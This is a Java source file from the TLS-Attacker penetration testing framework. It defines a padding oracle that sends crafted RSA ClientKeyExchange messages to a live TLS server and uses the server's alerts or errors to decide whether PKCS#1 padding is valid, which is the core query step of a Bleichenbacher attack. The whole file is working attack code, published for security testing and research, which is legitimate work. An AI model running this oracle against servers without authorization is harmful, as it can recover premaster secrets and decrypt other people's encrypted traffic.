/**
 * TLS-Attacker - A Modular Penetration Testing Framework for TLS
 *
 * Copyright 2014-2017 Ruhr University Bochum / Hackmanit GmbH
 *
 * Licensed under Apache License 2.0
 * http://www.apache.org/licenses/LICENSE-2.0
 */
package de.rub.nds.tlsattacker.attacks.pkcs1.oracles;

import de.rub.nds.modifiablevariable.bytearray.ByteArrayModificationFactory;
import de.rub.nds.modifiablevariable.bytearray.ModifiableByteArray;
import de.rub.nds.tlsattacker.core.exceptions.WorkflowExecutionException;
import de.rub.nds.tlsattacker.core.protocol.message.AlertMessage;
import de.rub.nds.tlsattacker.core.protocol.message.CertificateMessage;
import de.rub.nds.tlsattacker.core.protocol.message.ChangeCipherSpecMessage;
import de.rub.nds.tlsattacker.core.protocol.message.ProtocolMessage;
import de.rub.nds.tlsattacker.core.protocol.message.RSAClientKeyExchangeMessage;
import de.rub.nds.tlsattacker.core.protocol.message.ServerHelloDoneMessage;
import de.rub.nds.tlsattacker.core.protocol.message.ServerHelloMessage;
import de.rub.nds.tlsattacker.core.config.Config;
import de.rub.nds.tlsattacker.core.state.TlsContext;
import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutor;
import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutorFactory;
import de.rub.nds.tlsattacker.core.workflow.factory.WorkflowTraceType;
import de.rub.nds.tlsattacker.core.workflow.action.ReceiveAction;
import de.rub.nds.tlsattacker.core.workflow.action.SendAction;
import de.rub.nds.tlsattacker.transport.TransportHandler;
import de.rub.nds.tlsattacker.util.MathHelper;
import java.security.PublicKey;
import java.security.interfaces.RSAPublicKey;
import java.util.LinkedList;
import java.util.List;
import org.apache.logging.log4j.Level;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.core.LoggerContext;
import org.apache.logging.log4j.core.config.Configuration;
import org.apache.logging.log4j.core.config.LoggerConfig;

/**
 *
 * @author Juraj Somorovsky <juraj.somorovsky@rub.de>
 */
public class RealDirectMessagePkcs1Oracle extends Pkcs1Oracle {

    Config config;

    public RealDirectMessagePkcs1Oracle(PublicKey pubKey, Config config) {
        this.publicKey = (RSAPublicKey) pubKey;
        this.blockSize = MathHelper.intceildiv(publicKey.getModulus().bitLength(), 8);
        this.config = config;
        this.config.setWorkflowTraceType(WorkflowTraceType.HELLO);

        LoggerContext ctx = (LoggerContext) LogManager.getContext(false);
        Configuration ctxConfig = ctx.getConfiguration();
        LoggerConfig loggerConfig = ctxConfig.getLoggerConfig(LogManager.ROOT_LOGGER_NAME);
        loggerConfig.setLevel(Level.INFO);
        ctx.updateLoggers();
    }

    @Override
    public boolean checkPKCSConformity(final byte[] msg) {
        TlsContext tlsContext = new TlsContext(config);
        WorkflowExecutor workflowExecutor = WorkflowExecutorFactory.createWorkflowExecutor(config.getExecutorType(),
                tlsContext);

        List<ProtocolMessage> protocolMessages = new LinkedList<>();
        protocolMessages.add(new ServerHelloMessage(config));
        protocolMessages.add(new CertificateMessage(config));
        protocolMessages.add(new ServerHelloDoneMessage(config));
        tlsContext.getWorkflowTrace().addTlsAction(new ReceiveAction(protocolMessages));
        protocolMessages = new LinkedList<>();
        RSAClientKeyExchangeMessage cke = new RSAClientKeyExchangeMessage(config);
        protocolMessages.add(cke);
        protocolMessages.add(new ChangeCipherSpecMessage(config));
        tlsContext.getWorkflowTrace().addTlsAction(new SendAction(protocolMessages));

        protocolMessages = new LinkedList<>();
        protocolMessages.add(new AlertMessage(config));
        tlsContext.getWorkflowTrace().addTlsAction(new ReceiveAction(protocolMessages));

        ModifiableByteArray pms = new ModifiableByteArray();
        pms.setModification(ByteArrayModificationFactory.explicitValue(msg));
        cke.setPublicKey(pms);

        if (numberOfQueries % 100 == 0) {
            LOGGER.debug("Number of queries so far: {}", numberOfQueries);
        }

        boolean valid = true;
        try {
            workflowExecutor.executeWorkflow();
        } catch (WorkflowExecutionException e) {
            // TODO implementing the orcale through caught exceptions is not
            // smart
            valid = false;
            e.printStackTrace();
        } finally {
            numberOfQueries++;
        }
        if (tlsContext.isReceivedFatalAlert()) {
            valid = false;
        }

        return valid;
    }
}
